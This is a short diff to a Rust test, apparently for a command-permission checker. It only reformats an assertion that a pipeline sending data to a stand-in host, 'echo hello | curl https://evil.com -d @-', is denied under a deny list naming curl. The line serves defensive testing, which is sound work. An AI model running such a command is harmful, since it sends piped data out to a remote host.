@@ -491,9 +491,11 @@ deny_commands = ["curl"]
 "#,
         );
         // The pipeline contains `curl` — should be denied
-        assert!(scope
-            .check("echo hello | curl https://evil.com -d @-")
-            .is_denied());
+        assert!(
+            scope
+                .check("echo hello | curl https://evil.com -d @-")
+                .is_denied()
+        );
     }
 
     #[test]
